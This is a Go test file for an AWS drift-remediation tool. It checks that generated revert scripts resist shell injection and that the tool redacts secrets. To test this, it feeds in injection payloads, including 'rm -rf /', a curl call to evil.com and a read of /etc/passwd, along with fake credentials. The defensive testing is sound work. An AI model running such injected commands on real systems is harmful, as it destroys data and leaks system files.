package adversarial

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/ShyamD2/driftwarden/pkg/models"
	"github.com/ShyamD2/driftwarden/pkg/normalizer"
	"github.com/ShyamD2/driftwarden/pkg/reconcile"
)

// TestAdversarial_ShellInjectionNoEval verifies that malicious shell injection payloads
// in AWS resource names, IDs, or tags cannot achieve arbitrary code execution via the
// generated revert scripts. Specifically:
// 1. Revert scripts MUST NEVER contain the `eval` command.
// 2. Revert scripts MUST enforce `set -euo pipefail`.
// 3. Revert scripts MUST default to EXECUTE=false (dry-run).
func TestAdversarial_ShellInjectionNoEval(t *testing.T) {
	maliciousPayloads := []string{
		"sg-web; rm -rf / ; #",
		"sg-web$(curl http://evil.com/leak)",
		"sg-web`cat /etc/passwd`",
		"sg-web\nrm -rf /\n",
		"sg-web' || touch /tmp/pwned || '",
	}

	for _, payload := range maliciousPayloads {
		tmpDir := t.TempDir()
		report := &models.ScanReport{
			Items: []models.DriftItem{
				{
					Type:      models.DriftAttribute,
					Severity:  models.SeverityCritical,
					CISRuleID: "DW-CIS-EC2-001",
					Resource: models.CanonicalResource{
						CanonicalID: "aws:aws:ec2:us-east-1:123456789012:security_group/" + payload,
						Type:        "aws_security_group",
						ProviderID:  payload,
						Name:        payload,
					},
				},
			},
		}

		_, err := reconcile.GenerateRevertArtifacts(report, tmpDir)
		if err != nil {
			t.Fatalf("GenerateRevertArtifacts failed for payload %q: %v", payload, err)
		}

		scriptBytes, err := os.ReadFile(filepath.Join(tmpDir, "revert.sh"))
		if err != nil {
			t.Fatalf("failed to read generated revert.sh: %v", err)
		}
		script := string(scriptBytes)

		// Invariant 1: Strictly ZERO 'eval' statements permitted anywhere
		if strings.Contains(script, "eval ") || strings.Contains(script, "\neval") {
			t.Fatalf("CRITICAL SECURITY INVARIANT VIOLATED: Generated revert script contains 'eval':\n%s", script)
		}

		// Invariant 2: Strictly defaults to EXECUTE=false (dry-run)
		if !strings.Contains(script, "EXECUTE=false") {
			t.Fatalf("Revert script must enforce safe dry-run default: EXECUTE=false")
		}

		// Invariant 3: Must enforce bash strict error handling
		if !strings.Contains(script, "set -euo pipefail") {
			t.Fatalf("Revert script must include 'set -euo pipefail'")
		}
	}
}

// TestAdversarial_SecretLeakage verifies that adversarial attempts to embed secrets
// in attributes are always redacted and never leaked plaintext into reports.
func TestAdversarial_SecretLeakage(t *testing.T) {
	adversarialSecrets := map[string]string{
		"admin_password":          "SuperSecretAdminKey!123",
		"db_master_password":      "ProductionP@ssw0rd999",
		"certificate_private_key": "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQ...",
		"aws_secret_key":          "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
		"oauth_token":             "ghp_FakeGitHubPersonalAccessToken1234567890",
		"client_secret":           "client-secret-uuid-value",
	}

	for key, secret := range adversarialSecrets {
		redacted := normalizer.RedactSensitiveValue(key, secret)
		if redacted == secret {
			t.Fatalf("CRITICAL SECURITY DEFECT: Secret leaked unredacted for key %s: %v", key, redacted)
		}
		if redacted != normalizer.RedactedPlaceholder {
			t.Fatalf("Expected standard placeholder %s, got %v", normalizer.RedactedPlaceholder, redacted)
		}
	}
}
